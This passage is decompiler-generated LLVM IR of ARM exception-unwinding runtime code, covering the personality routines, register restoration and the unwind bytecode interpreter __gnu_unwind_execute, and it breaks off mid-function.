  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_20cf4.602 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 15, 27, 68, 86, 69, 87, 16, 17, 70, 71, 72, 88, 18, 89, 90, 91, 19, 92, 93, 94, 20, 73, 95, 96, 21, 22, 23, 97, 74, 98, 24, 99, 25, 100, 101, 102, 4, 26, 103, 75, 104, 77, 105, 106, 107, 34, 33, 35, 108, 109, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 32, 63, 76, 80, 110, 5, 111, 112, 81 }
  uselistorder i32 -2, { 0, 27, 28, 6, 3, 4, 2, 7, 8, 9, 1, 5, 22, 23, 24, 25, 26, 15, 16, 17, 18, 19, 20, 21, 10, 11, 12, 13, 14 }
  uselistorder i32 80, { 13, 14, 15, 8, 6, 7, 0, 2, 1, 3, 4, 5, 11, 9, 10, 12 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17774, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17690, { 1, 0 }
  uselistorder label %dec_label_pc_17658, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1761c, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_17598, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_174d8, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_174d4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17434, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_17390, { 1, 0 }
  uselistorder label %dec_label_pc_17390.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_17390.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_17830(i32 %arg1) local_unnamed_addr {
dec_label_pc_17830:
  %v0_17830 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17830, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17830
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17830, %bb
  %v10_17838 = phi i32 [ %arg1, %dec_label_pc_17830 ], [ 0, %bb ]
  ret i32 %v10_17838

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 22, 21, 20, 23, 25, 26, 27, 39, 16, 24, 40, 41, 42, 43, 44, 45, 36, 37, 28, 29, 17, 5, 38, 18, 19, 4, 13, 6, 32, 14, 12, 15, 7, 8, 9, 30, 10, 11, 33, 35, 31, 34, 46, 47 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 41, 16, 17, 18, 37, 38, 39, 40, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 33, 34 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_17840 = load i32, i32* @r1, align 4
  %v2_17840 = load i32, i32* @r2, align 4
  %v4_17840 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_17840, i32 %v2_17840, i32 2)
  ret i32 %v4_17840
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_17848 = load i32, i32* @r1, align 4
  %v2_17848 = load i32, i32* @r2, align 4
  %v4_17848 = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_17848, i32 %v2_17848, i32 1)
  ret i32 %v4_17848
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_17850 = load i32, i32* @r1, align 4
  %v2_17850 = load i32, i32* @r2, align 4
  %v4_17850 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_17850, i32 %v2_17850, i32 0)
  ret i32 %v4_17850

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 7, 8, 9, 41, 10, 0, 19, 11, 20, 21, 22, 23, 42, 43, 44, 15, 16, 17, 18, 45, 46, 47, 58, 59, 60, 61, 50, 1, 51, 48, 49, 2, 3, 4, 39, 40, 5, 6, 52, 53, 54, 55, 56, 57, 38, 24, 12, 13, 14, 27, 28, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_17858 = add i32 %tmp, 56
  %v4_17858 = inttoptr i32 %v3_17858 to i32*
  %v5_17858 = load i32, i32* %v4_17858, align 4
  %v6_17858 = add i32 %tmp, 60
  %v7_17858 = inttoptr i32 %v6_17858 to i32*
  %v8_17858 = load i32, i32* %v7_17858, align 4
  %v2_17864 = load i32, i32* %arg1, align 4
  %v3_17864 = add i32 %tmp, 4
  %v4_17864 = inttoptr i32 %v3_17864 to i32*
  %v5_17864 = load i32, i32* %v4_17864, align 4
  store i32 %v5_17864, i32* @r1, align 4
  %v12_17864 = add i32 %tmp, 16
  %v13_17864 = inttoptr i32 %v12_17864 to i32*
  %v14_17864 = load i32, i32* %v13_17864, align 4
  store i32 %v14_17864, i32* @r4, align 4
  %v15_17864 = add i32 %tmp, 20
  %v16_17864 = inttoptr i32 %v15_17864 to i32*
  %v17_17864 = load i32, i32* %v16_17864, align 4
  store i32 %v17_17864, i32* @r5, align 4
  %v18_17864 = add i32 %tmp, 24
  %v19_17864 = inttoptr i32 %v18_17864 to i32*
  %v20_17864 = load i32, i32* %v19_17864, align 4
  store i32 %v20_17864, i32* @r6, align 4
  %v21_17864 = add i32 %tmp, 28
  %v22_17864 = inttoptr i32 %v21_17864 to i32*
  %v23_17864 = load i32, i32* %v22_17864, align 4
  store i32 %v23_17864, i32* @r7, align 4
  %v24_17864 = add i32 %tmp, 32
  %v25_17864 = inttoptr i32 %v24_17864 to i32*
  %v26_17864 = load i32, i32* %v25_17864, align 4
  store i32 %v26_17864, i32* @r8, align 4
  %v27_17864 = add i32 %tmp, 36
  %v28_17864 = inttoptr i32 %v27_17864 to i32*
  %v29_17864 = load i32, i32* %v28_17864, align 4
  store i32 %v29_17864, i32* @sb, align 4
  %v30_17864 = add i32 %tmp, 40
  %v31_17864 = inttoptr i32 %v30_17864 to i32*
  %v32_17864 = load i32, i32* %v31_17864, align 4
  store i32 %v32_17864, i32* @sl, align 4
  store i32 %v8_17858, i32* @ip, align 4
  store i32 %v5_17858, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_17858)
  ret i32 %v2_17864

; uselistorder directives
  uselistorder i32 %v8_17858, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 39, 40, 41, 42, 10, 11, 4, 0, 45, 5, 43, 44, 8, 9, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 1, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 19, 20, 2, 33, 34, 35, 36, 37, 38, 17, 18, 7, 12, 13, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 14, 15, 16 }
  uselistorder i32 40, { 24, 20, 21, 22, 23, 8, 25, 1, 2, 9, 4, 5, 6, 3, 10, 11, 7, 12, 13, 14, 15, 16, 17, 19, 18, 0 }
  uselistorder i32* @sb, { 91, 92, 93, 4, 5, 6, 7, 74, 75, 76, 77, 78, 79, 80, 81, 82, 85, 83, 84, 86, 2, 63, 64, 48, 49, 3, 8, 9, 10, 0, 11, 12, 17, 18, 13, 14, 15, 16, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 1, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 66, 67, 68, 69, 70, 71, 72, 73, 87, 88, 89, 90 }
  uselistorder i32 36, { 15, 14, 4, 13, 7, 11, 8, 16, 6, 9, 3, 5, 12, 10, 0, 1, 2 }
  uselistorder i32* @r8, { 209, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 1, 208, 0, 36, 210, 8, 211, 9, 37, 38, 39, 40, 23, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 33, 34, 35, 41, 42, 43, 44, 45, 46, 47, 10, 212, 20, 21, 4, 22, 158, 159, 5, 160, 161, 162, 163, 164, 165, 166, 167, 6, 168, 169, 170, 171, 172, 173, 174, 175, 144, 145, 146, 147, 108, 109, 110, 111, 112, 125, 126, 127, 128, 48, 49, 50, 51, 11, 12, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 14, 15, 16, 17, 18, 13, 63, 64, 65, 66, 19, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 82, 79, 80, 81, 86, 83, 84, 85, 87, 88, 89, 90, 91, 93, 92, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 148, 149, 2, 153, 150, 151, 152, 154, 155, 156, 157, 176, 177, 178, 179, 180, 181, 182, 183, 184, 188, 185, 186, 187, 7, 189, 190 }
  uselistorder i32 32, { 82, 79, 80, 81, 49, 70, 71, 62, 63, 83, 84, 46, 57, 85, 45, 78, 47, 50, 48, 69, 67, 68, 64, 65, 66, 51, 59, 60, 52, 74, 75, 76, 1, 2, 4, 3, 77, 6, 5, 8, 7, 10, 9, 61, 12, 11, 14, 13, 16, 15, 18, 17, 58, 20, 19, 21, 23, 22, 25, 24, 26, 27, 29, 28, 53, 54, 30, 72, 31, 73, 32, 33, 34, 35, 36, 37, 55, 38, 39, 40, 56, 41, 0, 42, 43, 44 }
  uselistorder i32 28, { 42, 11, 27, 30, 12, 23, 13, 43, 24, 44, 45, 46, 47, 7, 8, 28, 29, 25, 26, 14, 39, 40, 41, 0, 16, 1, 17, 2, 18, 3, 19, 4, 20, 5, 21, 6, 22, 9, 15, 32, 31, 33, 34, 35, 36, 37, 38, 10 }
  uselistorder i32 24, { 98, 97, 67, 68, 55, 56, 99, 10, 11, 100, 0, 1, 59, 60, 61, 62, 63, 64, 57, 58, 12, 65, 66, 69, 70, 7, 13, 91, 92, 93, 94, 37, 38, 14, 71, 72, 44, 73, 52, 39, 40, 41, 42, 43, 45, 46, 47, 48, 49, 50, 51, 53, 54, 74, 75, 76, 77, 15, 16, 17, 18, 2, 19, 20, 8, 78, 79, 21, 22, 3, 23, 80, 24, 25, 26, 9, 81, 27, 28, 29, 82, 30, 4, 83, 84, 85, 86, 31, 32, 87, 33, 88, 34, 5, 89, 6, 35, 90, 95, 36, 96 }
  uselistorder i32 20, { 115, 113, 114, 116, 1, 4, 10, 31, 36, 37, 25, 26, 117, 27, 118, 119, 120, 2, 121, 5, 122, 123, 3, 124, 32, 11, 28, 29, 30, 33, 34, 35, 12, 38, 39, 0, 125, 102, 103, 104, 105, 106, 107, 108, 13, 109, 110, 111, 24, 41, 42, 14, 43, 15, 44, 23, 16, 45, 40, 46, 47, 48, 50, 6, 49, 51, 52, 53, 54, 55, 56, 7, 57, 58, 59, 60, 61, 62, 64, 65, 17, 63, 66, 67, 68, 69, 70, 71, 73, 74, 18, 72, 75, 76, 77, 78, 80, 81, 19, 79, 82, 83, 84, 85, 86, 87, 89, 20, 88, 90, 91, 92, 95, 8, 93, 21, 94, 96, 97, 100, 9, 98, 22, 99, 101, 112 }
  uselistorder i32* @r1, { 146, 14, 15, 16, 4, 147, 148, 62, 63, 79, 81, 42, 2, 150, 43, 149, 144, 44, 45, 46, 17, 64, 1, 65, 66, 18, 153, 23, 5, 26, 27, 28, 29, 30, 31, 32, 6, 154, 155, 156, 157, 0, 158, 19, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 7, 176, 177, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 68, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 3, 78, 20, 80, 82, 83, 178, 21, 180, 181, 182, 183, 99, 100, 33, 84, 34, 35, 179, 22, 36, 37, 85, 86, 130, 131, 132, 133, 134, 135, 136, 41, 137, 8, 138, 139, 9, 140, 143, 141, 10, 142, 87, 88, 25, 109, 89, 114, 145, 120, 121, 12, 122, 184, 185, 151, 152, 24, 13, 90, 123, 124, 91, 92, 38, 39, 40, 93, 94, 95, 96, 97, 125, 98, 126, 127, 11, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 112, 113, 115, 116, 117, 118, 119, 128, 129 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 6, 1, 7, 15, 16, 17, 18, 19, 20, 8, 11, 12, 9, 13, 14, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 27, 28, 8, 9, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 11, 10, 2, 12, 13, 14, 15, 16, 4, 5, 1, 6, 0, 7, 29, 30 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17874 = load i32, i32* @r0, align 4
  ret i32 %v1_17874
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1787c = load i32, i32* @r0, align 4
  ret i32 %v1_1787c
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_17890 = ptrtoint i32* %stack_var_-68 to i32
  %v2_17894 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_17890, i32 0)
  ret i32 %v2_17894

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_178b4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_178b8 = call i32 @__gnu_Unwind_Resume(i32 %v2_178b4, i32 0)
  ret i32 %v2_178b8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_178d8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_178dc = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_178d8, i32 0)
  ret i32 %v2_178dc

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_178fc = ptrtoint i32* %stack_var_-68 to i32
  %v6_17900 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_178fc, i32 %arg2, i8* %arg3, i32 %v2_178fc)
  ret i32 %v6_17900

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1792c = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_17934 = add i32 %tmp1, 76
  %v2_17934 = inttoptr i32 %v1_17934 to i32*
  %v3_17934 = load i32, i32* %v2_17934, align 4
  %v1_17938 = add i32 %v3_17934, 7
  %v2_17938 = inttoptr i32 %v1_17938 to i8*
  %v3_17938 = load i8, i8* %v2_17938, align 1
  %v4_17938 = zext i8 %v3_17938 to i32
  %v1_1793c = add i32 %v3_17934, 8
  %v3_17940 = mul nuw nsw i32 %v4_17938, 4
  %v2_17944 = add i32 %v3_17940, %v1_1793c
  %v3_17944 = inttoptr i32 %v2_17944 to i8*
  ret i8* %v3_17944
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_17954 = load i32, i32* @r6, align 4
  %v21_17954 = load i32, i32* @lr, align 4
  %v0_17958 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17958, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_17968

dec_label_pc_17968:                               ; preds = %dec_label_pc_17968.backedge, %entry
  %v3_17974 = phi i32 [ %v0_17968.pre, %dec_label_pc_17968.backedge ], [ %tmp, %entry ]
  %v1_17968 = add i32 %v3_17974, 8
  %v2_17968 = inttoptr i32 %v1_17968 to i8*
  %v3_17968 = load i8, i8* %v2_17968, align 1
  %v4_17968 = zext i8 %v3_17968 to i32
  store i32 %v4_17968, i32* %r3.global-to-local, align 4
  %v2_1796c = icmp eq i8 %v3_17968, 0
  store i1 %v2_1796c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1796c, label %dec_label_pc_1797c, label %.thread

.thread:                                          ; preds = %dec_label_pc_17968
  %v2_17970 = add nsw i32 %v4_17968, -1
  store i32 %v2_17970, i32* %r3.global-to-local, align 4
  %v2_17974 = trunc i32 %v2_17970 to i8
  store i8 %v2_17974, i8* %v2_17968, align 1
  %v0_17978.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17978.pr.pr, label %.thread.dec_label_pc_1797c_crit_edge, label %dec_label_pc_179a4

.thread.dec_label_pc_1797c_crit_edge:             ; preds = %.thread
  %v0_1797c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1797c

dec_label_pc_1797c:                               ; preds = %.thread.dec_label_pc_1797c_crit_edge, %dec_label_pc_17968
  %v0_1797c = phi i32 [ %v0_1797c.pre, %.thread.dec_label_pc_1797c_crit_edge ], [ %v3_17974, %dec_label_pc_17968 ]
  %v1_1797c = add i32 %v0_1797c, 9
  %v2_1797c = inttoptr i32 %v1_1797c to i8*
  %v3_1797c = load i8, i8* %v2_1797c, align 1
  %v4_1797c = zext i8 %v3_1797c to i32
  store i32 %v4_1797c, i32* %r3.global-to-local, align 4
  %v2_17980 = icmp eq i8 %v3_1797c, 0
  store i1 %v2_17980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17980, label %dec_label_pc_17a84, label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_17a78, %dec_label_pc_1797c
  %v2_1798c = phi i32 [ %v0_17a78, %dec_label_pc_17a78 ], [ %v0_1797c, %dec_label_pc_1797c ]
  %v0_17988 = phi i32 [ %v4_17a78, %dec_label_pc_17a78 ], [ %v4_1797c, %dec_label_pc_1797c ]
  %v1_17988 = add nsw i32 %v0_17988, -1
  store i32 %v1_17988, i32* %r3.global-to-local, align 4
  %v1_1798c = trunc i32 %v1_17988 to i8
  %v3_1798c = add i32 %v2_1798c, 9
  %v4_1798c = inttoptr i32 %v3_1798c to i8*
  store i8 %v1_1798c, i8* %v4_1798c, align 1
  %v0_17990 = load i32, i32* @r5, align 4
  %v1_17990 = add i32 %v0_17990, 4
  %v2_17990 = inttoptr i32 %v1_17990 to i32*
  %v3_17990 = load i32, i32* %v2_17990, align 4
  store i32 %v3_17990, i32* %r2.global-to-local, align 4
  %v1_17994 = inttoptr i32 %v3_17990 to i32*
  %v2_17994 = load i32, i32* %v1_17994, align 4
  store i32 %v2_17994, i32* %r0.global-to-local, align 4
  %v4_17994 = add i32 %v3_17990, 4
  store i32 %v4_17994, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1799c = inttoptr i32 %v0_17990 to i32*
  store i32 %v2_17994, i32* %v1_1799c, align 4
  %v5_1799c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1799c, i32* %v2_17990, align 4
  %v0_179a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_179a0 = trunc i32 %v0_179a0 to i8
  %v2_179a0 = load i32, i32* @r5, align 4
  %v3_179a0 = add i32 %v2_179a0, 8
  %v4_179a0 = inttoptr i32 %v3_179a0 to i8*
  store i8 %v1_179a0, i8* %v4_179a0, align 1
  br label %dec_label_pc_179a4

dec_label_pc_179a4:                               ; preds = %.thread, %dec_label_pc_17988, %.thread6
  %v0_179a4 = load i32, i32* @r5, align 4
  %v1_179a4 = inttoptr i32 %v0_179a4 to i32*
  %v2_179a4 = load i32, i32* %v1_179a4, align 4
  %v3_179a8 = udiv i32 %v2_179a4, 16777216
  store i32 %v3_179a8, i32* @r4, align 4
  store i32 %v3_179a8, i32* %ip.global-to-local, align 4
  %v3_179b0 = mul i32 %v2_179a4, 256
  store i32 %v3_179b0, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_179a4, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_179b0, i32* %v1_179a4, align 4
  br i1 %tmp183, label %dec_label_pc_17a84, label %dec_label_pc_179c0

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179a4
  %v0_179c0 = load i32, i32* @r4, align 4
  %v1_179c0 = and i32 %v0_179c0, 128
  store i32 %v1_179c0, i32* %r1.global-to-local, align 4
  %v2_179c0 = icmp eq i32 %v1_179c0, 0
  store i1 %v2_179c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179c0, label %dec_label_pc_17a9c, label %dec_label_pc_179c8

dec_label_pc_179c8:                               ; preds = %dec_label_pc_179c0
  %v1_179c8 = and i32 %v0_179c0, 240
  store i32 %v1_179c8, i32* @r6, align 4
  %v7_179cc = icmp eq i32 %v1_179c8, 128
  store i1 %v7_179cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_179cc, label %dec_label_pc_179d4, label %dec_label_pc_17af8

dec_label_pc_179d4:                               ; preds = %dec_label_pc_179c8
  %v0_179d4 = load i32, i32* @r5, align 4
  %v1_179d4 = add i32 %v0_179d4, 8
  %v2_179d4 = inttoptr i32 %v1_179d4 to i8*
  %v3_179d4 = load i8, i8* %v2_179d4, align 1
  %v4_179d4 = zext i8 %v3_179d4 to i32
  store i32 %v4_179d4, i32* %r3.global-to-local, align 4
  %v2_179d8 = icmp eq i8 %v3_179d4, 0
  store i1 %v2_179d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179d8, label %dec_label_pc_179e8, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_179d4
  %v2_179dc = add nsw i32 %v4_179d4, -1
  store i32 %v2_179dc, i32* %r3.global-to-local, align 4
  %v2_179e0 = trunc i32 %v2_179dc to i8
  store i8 %v2_179e0, i8* %v2_179d4, align 1
  %v0_179e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_179e4.pr.pr, label %.thread3.dec_label_pc_179e8_crit_edge, label %dec_label_pc_17a18

.thread3.dec_label_pc_179e8_crit_edge:            ; preds = %.thread3
  %v0_179e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_179e8

dec_label_pc_179e8:                               ; preds = %.thread3.dec_label_pc_179e8_crit_edge, %dec_label_pc_179d4
  %v2_179fc = phi i32 [ %v0_179e8.pre, %.thread3.dec_label_pc_179e8_crit_edge ], [ %v0_179d4, %dec_label_pc_179d4 ]
  %v1_179e8 = add i32 %v2_179fc, 9
  %v2_179e8 = inttoptr i32 %v1_179e8 to i8*
  %v3_179e8 = load i8, i8* %v2_179e8, align 1
  %v4_179e8 = zext i8 %v3_179e8 to i32
  store i32 %v4_179e8, i32* %r3.global-to-local, align 4
  %v2_179ec = icmp eq i8 %v3_179e8, 0
  store i1 %v2_179ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179ec, label %dec_label_pc_17a28, label %dec_label_pc_179f8

dec_label_pc_179f8:                               ; preds = %dec_label_pc_179e8
  %v1_179f8 = add nsw i32 %v4_179e8, -1
  store i32 %v1_179f8, i32* %r3.global-to-local, align 4
  %v1_179fc = trunc i32 %v1_179f8 to i8
  store i8 %v1_179fc, i8* %v2_179e8, align 1
  %v0_17a00 = load i32, i32* @r5, align 4
  %v1_17a00 = add i32 %v0_17a00, 4
  %v2_17a00 = inttoptr i32 %v1_17a00 to i32*
  %v3_17a00 = load i32, i32* %v2_17a00, align 4
  store i32 %v3_17a00, i32* %r2.global-to-local, align 4
  %v1_17a04 = inttoptr i32 %v3_17a00 to i32*
  %v2_17a04 = load i32, i32* %v1_17a04, align 4
  store i32 %v2_17a04, i32* %r0.global-to-local, align 4
  %v4_17a04 = add i32 %v3_17a00, 4
  store i32 %v4_17a04, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17a04, i32* %v2_17a00, align 4
  %v0_17a10 = load i32, i32* %r3.global-to-local, align 4
  %v1_17a10 = trunc i32 %v0_17a10 to i8
  %v2_17a10 = load i32, i32* @r5, align 4
  %v3_17a10 = add i32 %v2_17a10, 8
  %v4_17a10 = inttoptr i32 %v3_17a10 to i8*
  store i8 %v1_17a10, i8* %v4_17a10, align 1
  %v0_17a14 = load i32, i32* %r0.global-to-local, align 4
  %v1_17a14 = load i32, i32* @r5, align 4
  %v2_17a14 = inttoptr i32 %v1_17a14 to i32*
  store i32 %v0_17a14, i32* %v2_17a14, align 4
  br label %dec_label_pc_17a18

dec_label_pc_17a18:                               ; preds = %.thread3, %dec_label_pc_179f8
  %v0_17a18 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17a18, i32* %r3.global-to-local, align 4
  %v3_17a1c = mul i32 %v0_17a18, 256
  store i32 %v3_17a1c, i32* %r0.global-to-local, align 4
  %v1_17a20 = load i32, i32* @r5, align 4
  %v2_17a20 = inttoptr i32 %v1_17a20 to i32*
  store i32 %v3_17a1c, i32* %v2_17a20, align 4
  %v0_17a24 = load i32, i32* %r3.global-to-local, align 4
  %v3_17a24 = udiv i32 %v0_17a24, 16777216
  br label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %dec_label_pc_179e8, %dec_label_pc_17a18
  %storemerge133 = phi i32 [ %v3_17a24, %dec_label_pc_17a18 ], [ 176, %dec_label_pc_179e8 ]
  %v1_17a28 = load i32, i32* %ip.global-to-local, align 4
  %v4_17a28 = mul i32 %v1_17a28, 256
  %v5_17a28 = or i32 %v4_17a28, %storemerge133
  store i32 %v5_17a28, i32* %r2.global-to-local, align 4
  %v7_17a2c = icmp eq i32 %v5_17a28, 32768
  store i1 %v7_17a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17a2c, label %dec_label_pc_17c38, label %dec_label_pc_17a34

dec_label_pc_17a34:                               ; preds = %dec_label_pc_17a28
  %v3_17a34 = mul i32 %v5_17a28, 16
  store i32 %v3_17a34, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17a44 = and i32 %v3_17a34, 65520
  store i32 %v3_17a44, i32* %r2.global-to-local, align 4
  %v0_17a48 = load i32, i32* @r7, align 4
  store i32 %v0_17a48, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_17a50 = call i32 @_Unwind_VRS_Pop(i32 %v0_17a48, i32 %v3_17a44, i32 0, i32 0)
  store i32 %v4_17a50, i32* %r0.global-to-local, align 4
  %v2_17a54 = icmp eq i32 %v4_17a50, 0
  store i1 %v2_17a54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a54, label %dec_label_pc_17a5c, label %dec_label_pc_17c38

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a34
  %v0_17a5c = load i32, i32* @r5, align 4
  %v1_17a5c = add i32 %v0_17a5c, 8
  %v2_17a5c = inttoptr i32 %v1_17a5c to i8*
  %v3_17a5c = load i8, i8* %v2_17a5c, align 1
  %v4_17a5c = zext i8 %v3_17a5c to i32
  store i32 %v4_17a5c, i32* %r3.global-to-local, align 4
  %v0_17a60 = load i32, i32* @r4, align 4
  %v1_17a60 = and i32 %v0_17a60, 32768
  %v2_17a60 = icmp eq i32 %v1_17a60, 0
  store i1 %v2_17a60, i1* %cpsr_z.global-to-local, align 1
